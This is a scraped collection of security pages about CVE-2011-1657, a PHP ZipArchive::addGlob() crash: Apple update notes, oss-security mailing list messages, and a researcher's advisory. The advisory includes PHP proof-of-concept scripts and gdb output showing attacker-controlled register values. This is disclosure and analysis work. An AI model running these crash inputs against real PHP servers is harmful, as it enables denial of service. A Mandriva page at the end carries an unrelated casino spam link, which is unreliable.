  Impact: Viewing a maliciously crafted movie file may lead to an unexpected application termination or arbitrary code execution

  Description: An off by one buffer overflow existed in the handling of rdrf atoms in QuickTime movie files.

  CVE-ID

  CVE-2011-3459 : Luigi Auriemma working with TippingPoint's Zero Day Initiative

* **QuickTime**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted JPEG2000 image file may lead to an unexpected application termination or arbitrary code execution

  Description: A buffer overflow existed in the handling of JPEG2000 files.

  CVE-ID

  CVE-2011-3250 : Luigi Auriemma working with TippingPoint's Zero Day Initiative

* **QuickTime**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Processing a maliciously crafted PNG image may lead to an unexpected application termination or arbitrary code execution

  Description: A buffer overflow existed in the handling of PNG files.

  CVE-ID

  CVE-2011-3460 : Luigi Auriemma working with TippingPoint's Zero Day Initiative

* **QuickTime**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted movie file may lead to an unexpected application termination or arbitrary code execution

  Description: A buffer overflow existed in the handling of FLC encoded movie files

  CVE-ID

  CVE-2011-3249 : Matt 'j00ru' Jurczyk working with TippingPoint's Zero Day Initiative

* **SquirrelMail**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8

  Impact: Multiple vulnerabilities in SquirrelMail

  Description: SquirrelMail is updated to version 1.4.22 to address several vulnerabilities, the most serious of which is a cross-site scripting issue. This issue does not affect OS X Lion systems. Further information is available via the SquirrelMail web site at <http://www.SquirrelMail.org/>

  CVE-ID

  CVE-2010-1637

  CVE-2010-2813

  CVE-2010-4554

  CVE-2010-4555

  CVE-2011-2023

* **Subversion**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Accessing a Subversion repository may lead to the disclosure of sensitive information

  Description: Subversion is updated to version 1.6.17 to address multiple vulnerabilities, the most serious of which may lead to the disclosure of sensitive information. Further information is available via the Subversion web site at <http://subversion.apache.org/>

  CVE-ID

  CVE-2011-1752

  CVE-2011-1783

  CVE-2011-1921

* **Time Machine**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: A remote attacker may access new backups created by the user's system

  Description: The user may designate a remote AFP volume or Time Capsule to be used for Time Machine backups. Time Machine did not verify that the same device was being used for subsequent backup operations. An attacker who is able to spoof the remote volume could gain access to new backups created by the user's system. This issue is addressed by verifying the unique identifier associated with a disk for backup operations.

  CVE-ID

  CVE-2011-3462 : Michael Roitzsch of the Technische Universität Dresden

* **Tomcat**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8

  Impact: Multiple vulnerabilities in Tomcat 6.0.32

  Description: Tomcat is updated to version 6.0.33 to address multiple vulnerabilities, the most serious of which may lead to the disclosure of sensitive information. Tomcat is only provided on Mac OS X Server systems. This issue does not affect OS X Lion systems. Further information is available via the Tomcat site at <http://tomcat.apache.org/>

  CVE-ID

  CVE-2011-2204

* **WebDAV Sharing**

  Available for: OS X Lion Server v10.7 to v10.7.2

  Impact: Local users may obtain system privileges

  Description: An issue existed in WebDAV Sharing's handling of user authentication. A user with a valid account on the server or one of its bound directories could cause the execution of arbitrary code with system privileges. This issue does not affect systems prior to OS X Lion.

  CVE-ID

  CVE-2011-3463 : Gordon Davisson of Crywolf

* **Webmail**

  Available for: OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted e-mail message may lead to the disclosure of message content

  Description: A cross-site scripting vulnerability existed in the handling of mail messages. This issue is addressed by updating Roundcube Webmail to version 0.6. This issue does not affect systems prior to OS X Lion. Further information is available via the Roundcube site at <http://trac.roundcube.net/>

  CVE-ID

  CVE-2011-2937

* **X11**

  Available for: Mac OS X v10.6.8, Mac OS X Server v10.6.8, OS X Lion v10.7 to v10.7.2, OS X Lion Server v10.7 to v10.7.2

  Impact: Viewing a maliciously crafted PDF file may lead to an unexpected application termination or arbitrary code execution

  Description: A memory corruption issue existed in FreeType's handling of Type 1 fonts. This issue is addressed by updating FreeType to version 2.4.7. Further information is available via the FreeType site at http://www.freetype.org/

  CVE-ID

  CVE-2011-3256 : Apple

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: August 23, 2024

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of OS X Lion v10.7.3 and Security Update 2012-001

[United States](https://support.apple.com/en-us/103346/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from www.openwall.com_9d3dcff2_20250124_201714.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](7) [[next>]](9) [[<thread-prev]](7) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20110701223621.34a99e20@redhat.com>
Date: Fri, 1 Jul 2011 22:36:21 +0200
From: Tomas Hoger <thoger@...hat.com>
To: oss-security@...ts.openwall.com
Cc: cxib@...urityreason.com
Subject: Re: Re: php ZipArchive::addGlob() crashes on invalid
 flags

On Fri, 01 Jul 2011 18:34:51 +0200 Maksymilian Arciemowicz wrote:

> Using glob(3) with invalid flag may give unexpected results. Try
> glob(3) of netbsd implementations and use flags 0x39 0x40..

I don't have an easy way to test on netbsd, but looking at glob.h in
netbsd cvs, 0x40 is GLOB_ALTDIRFUNC, and 0x39 contains GLOB_APPEND,
which were problematic on glibc as well.  Both due to uninitialized
glob_t members.

--
Tomas Hoger / Red Hat Security Response Team

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_2525b74b_20250124_201713.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[<thread-prev]](6) [[thread-next>]](8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <4E0DF72B.6000904@securityreason.com>
Date: Fri, 01 Jul 2011 18:34:51 +0200
From: Maksymilian Arciemowicz <cxib@...urityreason.com>
To: Tomas Hoger <thoger@...hat.com>
CC: OSS Security <oss-security@...ts.openwall.com>
Subject: Re: php ZipArchive::addGlob() crashes on invalid flags

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> Reporter mentions this really was an underlying glob() implementation
> flaw, but that's not entirely true.  Maybe there are some flags that
> are not recognized by glob() and still cause it to crash, but the
> crashes I've been able to reproduce were due to the use of flags
> supported by glob() that require some glob_t struct setup before
> calling glob() (such as GLOB_ALTDIRFUNC).

hi Tomas,

The main problem is in the php code, not libc. Using glob(3) with
invalid flag may give unexpected results. Try glob(3) of netbsd
implementations and use flags 0x39 0x40..

0x39
0xbb8e2960 in pthread_mutex_lock () from /usr/lib/libpthread.so.0

or

eip            0xbb86bb12       0xbb86bb12 <realloc+118>
(gdb) x/i $eip
0xbb86bb12 <realloc+118>:       mov    0x8(%eax),%edi
(gdb) x/i $eax
0x410041:       Cannot access memory at address 0x410041

0x40
0x083b21c4 in php_XML_ParserFree ()

try netbsd/glob(3). glibc return alloca() problem

- --
Best Regards
pub   4096R/D6E5B530 2010-09-19
uid                  Maksymilian Arciemowicz (cx) <max@...b.net>
sub   4096R/58BA663C 2010-09-19
-----BEGIN PGP SIGNATURE-----

iQIcBAEBAgAGBQJODfcqAAoJEIO8+dzW5bUwUikP/09/wTrQXiJhoDxIt9BjWl+P
DVZNYhbG2G5Ncrv6IZYyeBVkrinpq8hDBuXTx6MtAFjt2MC71A2jqrs2Xhes97Z8
kpLqGbBoWfiSV+UMz/YTrKYOj7kClv1VRx7DQeohPZFtgQ360wLKPPzkyiGPoaci
U0q9oMSgXl6Qc2Jxi5AQQzi0tu8sviZmB7Yq+I7PN4Wq4v8jT0v8ukwAmV2tdwFn
LronZJzuTiOajiU9Xo7pTrmcRwVFHBPs6P/8gXQ4ryme5Wi7nDRIU/RB1fHEsqFL
17p3+lp4rEltxCgldrSVuSye/yBoId2QPHu1qaLpqODNe6H1Y5rgMy3BrO/QYCAB
6bfozNJX4EAL8rF37zT6YQ0Pvkqm8UhNDvYlEbtIy8Ac+7ht5fF5m5U77ZeA8TVn
ZBP0pIrZJ8n0FaGURQl6sShBB9AsdmeraVNKcx8+MndO2XleAxtp3FFUztc78gOL
QtfuEoUdJS8PuyST5SopFUugknyXdq87bBmsP09A3Ee06mHT2uubA3ZNScnTBhbq
j5E9d0ZpcsBadwSpeB9yjcXgNNw6zSe8B8P0Wzj213PU2rX3ZkD02aqu+449YAQu
Q+rG8RVzJ5EjOT8pyoMzyE7qC/RLpdxuZaW6SpSSsKHz+7nW8D+SC4ZfeFUWccz/
l5sEMIOmYU2n/cHTgD9O
=V4oy
-----END PGP SIGNATURE-----

Download attachment "[0xD6E5B530.asc](7/1)" of type "application/pgp-keys" (3087 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from securityreason.com_56a8bf18_20250124_201710.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **PHP 5.3.6 ZipArchive invalid use glob(3)** **2011-08-19 / 2012-03-12** Credit:  **[Maksymilian Arciemowicz](https://cxsecurity.com/author/Maksymilian%2BArciemowicz/1/)**  Risk: **Medium** Local: ****Yes**** Remote: **No** CVE: **[CVE-2011-1657](https://cxsecurity.com/cveshow/CVE-2011-1657/ "Click to see CVE-2011-1657")** CWE: **[CWE-399](https://cxsecurity.com/cwe/CWE-399 "Click to see CWE-399")**  CVSS Base Score: **5/10** Impact Subscore: **2.9/10** Exploitability Subscore: **10/10** Exploit range: **Remote** Attack complexity: **Low** Authentication: **No required** Confidentiality impact: **None** Integrity impact: **None** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

[ PHP 5.3.6 ZipArchive invalid use glob(3) ]
Author: Maksymilian Arciemowicz
http://cxib.net/
Date:
- Dis.: 01.04.2011
- Pub.: 19.08.2011
CVE: CVE-2011-1657
Affected Software (verified):
PHP 5.3.6 and prior
Fixed:
PHP 5.3.7
--- 0.Description ---
PHP is a general-purpose scripting language originally designed for web development to produce dynamic web pages. For this purpose, PHP code is embedded into the HTML source document and interpreted by a web server with a PHP processor module, which generates the web page document. It also has evolved to include a command-line interface capability and can be used in standalone graphical applications.
ZipArchive
This extension enables you to transparently read or write ZIP compressed archives and the files inside them.
--- 1. PHP 5.3.6 ZipArchive invalid use glob(3) ---
Functions like addGlob and addPattern are not described in documentation. Anyway we can call to ZipArchive::addGlob and ZipArchive::addPattern in PHP 5.3.6
http://pl2.php.net/manual/en/class.ziparchive.php
let's see ext/zip/php\_zip.c
531 if (0 != (ret = glob(pattern, flags & GLOB\_FLAGMASK, NULL, &globbuf))) {
...
1629 /\* 1 == glob, 2==pcre \*/
1630 if (type == 1) {
1631 if (zend\_parse\_parameters(ZEND\_NUM\_ARGS() TSRMLS\_CC, "s|la",
1632 &pattern, &pattern\_len, &flags, &options) == FAILURE) {
1633 return;
1634 }
1635 } else {
1636 if (zend\_parse\_parameters(ZEND\_NUM\_ARGS() TSRMLS\_CC, "s|sa",
1637 &pattern, &pattern\_len, &path, &path\_len, &options) == FAILURE) {
1638 return;
1639 }
1640 }
1641
invalid &flags may provide to crash. To use flags like GLOB\_ALTDIRFUNC, we should first declare gl\_opendir, gl\_closedir, gl\_lstat, gl\_stat. In PHP we only have
508 glob\_t globbuf;
...
530 globbuf.gl\_offs = 0;
531 if (0 != (ret = glob(pattern, flags & GLOB\_FLAGMASK, NULL, &globbuf))) {
for addglob() there are no GLOB flags validation like in php/glob(). Only flags like GLOB\_MARK|GLOB\_NOSORT|GLOB\_NOCHECK|GLOB\_NOESCAPE|GLOB\_BRACE|GLOB\_ONLYDIR|GLOB\_ERR should be allowed:
- GLOB\_MARK - Adds a slash to each directory returned
- GLOB\_NOSORT - Return files as they appear in the directory (no sorting)
- GLOB\_NOCHECK - Return the search pattern if no files matching it were found
- GLOB\_NOESCAPE - Backslashes do not quote metacharacters
- GLOB\_BRACE - Expands {a,b,c} to match 'a', 'b', or 'c'
- GLOB\_ONLYDIR - Return only directory entries which match the pattern
- GLOB\_ERR - Stop on read errors (like unreadable directories), by default errors are ignored.
---linux/ubuntu---
cx@cx64:~$ php -v
PHP 5.3.3-1ubuntu9.3 with Suhosin-Patch (cli) (built: Jan 12 2011 16:07:38)
Copyright (c) 1997-2009 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies
cx@cx64:~$ uname -a
Linux cx64 2.6.35-28-generic #49-Ubuntu SMP Tue Mar 1 14:39:03 UTC 2011 x86\_64 GNU/Linux
cx@cx64:/www$ cat zip.php
<?php
unlink("empty.zip");
fopen("empty.zip","a");
$nx=new ZipArchive();$nx->open("empty.zip");$nx->addGlob(str\_repeat("\*",333333),0x39);
?>cx@cx64:/www$ php zip.php
Segmentation fault
---linux/ubuntu---
Tested with NetBSD glob(3) implementation (netbsd 5.1 and PHP 5.3.6)
---bsd/netbsd---
unlink("empty.zip"); fopen("empty.zip","a"); $nx=new ZipArchive();$nx->open("empty.zip");$nx->addGlob(str\_repeat("A",1000000),0x39);
Program received signal SIGSEGV, Segmentation fault.
0xbb86bb12 in realloc () from /usr/lib/libc.so.12
(gdb) i r
eax 0x410041 4259905
ecx 0xc 12
edx 0xbfb00000 -1078984704
ebx 0xbb8c81f4 -1148419596
esp 0xbfbfa980 0xbfbfa980
ebp 0xbfbfa9d8 0xbfbfa9d8
esi 0xfc000 1032192
edi 0x0 0
eip 0xbb86bb12 0xbb86bb12 <realloc+118>
(gdb) x/i $eip
0xbb86bb12 <realloc+118>: mov 0x8(%eax),%edi
(gdb) x/i $eax
0x410041: Cannot access memory at address 0x410041
---bsd/netbsd---
and now try 'B'
---bsd/netbsd---
unlink("empty.zip");
fopen("empty.zip","a");
$nx=new
ZipArchive();$nx->open("empty.zip");$nx->addGlob(str\_repeat("B",1000000),0x39);
(gdb) x/i $eip
0xbb86bb12 <realloc+118>: mov 0x8(%eax),%edi
(gdb) x/i $eax
0x420042: Cannot access memory at address 0x420042
---bsd/netbsd---
A we get mov 0x8(%eax),%edi where eax=0x410041
B we get mov 0x8(%eax),%edi where eax=0x420042
and once again for eax=0x0
---bsd/netbsd---
$nx=new ZipArchive();$nx->open("empty.zip");$nx->addGlob("aa",0x39);
Program received signal SIGSEGV, Segmentation fault.
0xbb8e2960 in pthread\_mutex\_lock () from /usr/lib/libpthread.so.0
(gdb) bt
#0 0xbb8e2960 in pthread\_mutex\_lock () from /usr/lib/libpthread.so.0
#1 0xbb86a43a in \_malloc\_prefork () from /usr/lib/libc.so.12
#2 0xbb86bb9c in realloc () from /usr/lib/libc.so.12
#3 0xbb83610b in \_\_globfree30 () from /usr/lib/libc.so.12
#4 0xbb836cb7 in \_\_globfree30 () from /usr/lib/libc.so.12
#5 0xbb8372d9 in \_\_glob30 () from /usr/lib/libc.so.12
#6 0x083b1fe3 in php\_XML\_ParserFree ()
#7 0x083b45b7 in php\_XML\_ParserFree ()
#8 0x083b485f in php\_XML\_ParserFree ()
#9 0x0846f4b6 in execute ()
#10 0x084703c8 in execute ()
#11 0x0846e42d in execute ()
#12 0x08442b5a in zend\_execute\_scripts ()
#13 0x083c776b in php\_execute\_script ()
#14 0x08515c23 in zend\_get\_zval\_ptr\_ptr ()
#15 0x08067eb4 in \_\_\_start ()
#16 0x08067e17 in \_start ()
---bsd/netbsd---
to get other crash point, change 0x39 to 0x40 or use addPattern() with special crafted zip files.
---addPattern()---
$nx=new
ZipArchive();$nx->open("empty.zip");$nx->addPattern(str\_repeat("A",1));
0x083b21c4 in php\_XML\_ParserFree ()
---addPattern()---
--- 2. Fix ---
PHP 5.3.7
http://svn.php.net/viewvc/php/php-src/branches/PHP\_5\_3/ext/zip/php\_zip.c?view=log
PR/44959: Henning Petersen: glob forgets to closedir on out of space condition.
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gen/glob.c.diff?r1=1.29&r2=1.30&only\_with\_tag=MAIN&f=h
--- 3. Greets ---
Felipe
--- 4. Contact ---
Author: Maksymilian Arciemowicz

**##### References:**

 http://svn.php.net/viewvc/php/php-src/branches/PHP\_5\_3/ext/zip/php\_zip.c?view=log
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gen/glob.c.diff?r1=1.29&r2=1.30&only\_with\_tag=MAIN&f=h
http://svn.php.net/viewvc/php/php-src/branches/PHP\_5\_3/ext/zip/php\_zip.c?view=log
http://svn.php.net/viewvc/?view=revision&revision=310814
https://bugs.php.net/bug.php?id=54681
http://support.apple.com/kb/HT5130
http://lists.apple.com/archives/security-announce/2012/Feb/msg00000.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2011080235)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from www.openwall.com_b4289da0_20250124_201713.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](5) [[next>]](7) [[thread-next>]](7) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20110701173720.059b9ce6@redhat.com>
Date: Fri, 1 Jul 2011 17:37:20 +0200
From: Tomas Hoger <thoger@...hat.com>
To: OSS Security <oss-security@...ts.openwall.com>
Cc: cxib@...urityreason.com
Subject: php ZipArchive::addGlob() crashes on invalid flags

Hi!

Following PHP bug is marked as security and lists CVE-2011-1657:

<https://bugs.php.net/bug.php?id=54681>
<http://svn.php.net/viewvc/?view=revision&revision=310814>

The fix is committed, hence should be released with 5.3.7.

Reporter mentions this really was an underlying glob() implementation
flaw, but that's not entirely true.  Maybe there are some flags that
are not recognized by glob() and still cause it to crash, but the
crashes I've been able to reproduce were due to the use of flags
supported by glob() that require some glob_t struct setup before
calling glob() (such as GLOB_ALTDIRFUNC).

--
Tomas Hoger / Red Hat Security Response Team

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.mandriva.com_fd50fa99_20250124_201712.html ===


* [Tuxedo.org](https://tuxedo.org/ "Go to: Tuxedo")
* Store
* Mandriva Linux
* Enterprise Solutions
* Contact Us
* Language ![](/sites/all/themes/mandriva_customer/images/arrow-grey-bottom.gif)
  + English (International)
  + Français
  + Ð ÑÑÑÐºÐ¸Ð¹

# [Mandriva](/mandriva/)

* Download
* Mandriva Linux
* Community
* Help

## One

### The Linux desktopthat's easy to try and easy to keep

Download
![Mandriva One](/sites/all/themes/mandriva_customer/images/front/packshot_Mandriva_One.png)

## Powerpack

### Mandriva Linux- and more

Download
![Mandriva Linux Powerpack](/sites/all/themes/mandriva_customer/images/front/en-49.png)

## Mandriva Flash

### The mobile and installable Linux desktopon a USB key

Buy on Store
![Mandriva Flash](/sites/all/themes/mandriva_customer/images/front/mandriva-flash2.png)

### [Community](community)

* User Forums
* Support - FAQ
* Free Software
* Become a member

### Enterprise Solutions

* Enterprise Linux Products
* Asset Management Solution
* Professional Services
* Support & Maintenance

* Go to site »

### Mandriva Partners

* Worldwide offices
* Partner Program
* Technology Partners
* OEM
* Classmate PC with Mandriva Linux

### News

* Mandriva presents the launch of its new mobile desktop: Mandriva Flash 2008 Spring
* Speaking about Mandriva Linux 2008 Spring in media
* Speaking about Mandriva Linux 2008 Spring in media
* Mandriva presents its latest distribution: Mandriva Linux 2008 Spring
* Mandriva and Novatice Technologies present Edutice, The ready to use solution dedicated to educationand multimedia spaces
* # [Top 50 Online Casinos UK in 2023](https://montycasinos.com/online-casinos/)

more

* Download
  + Mandriva Linux 2008
  + Writing an ISO image
* Mandriva Linux
  + One
  + Powerpack
  + Mandriva Flash
* Community
  + Start
  + Register
  + Stay informed
  + Participate
  + Free software
* Help
  + Getting help
  + Knowledge Base
  + Documentation
  + Forums
  + Support Requests
  + Customer Care
  + Enterprise Support
* Enterprise Solutions
  + Products
  + Support
  + Services
  + Partners
  + Go to site »

Language
English (International)
Français
Ð ÑÑÑÐºÐ¸Ð¹

* © 2007 Mandriva S.A.
* About Us
* Legal Information
* Privacy Policy
* Contact Us


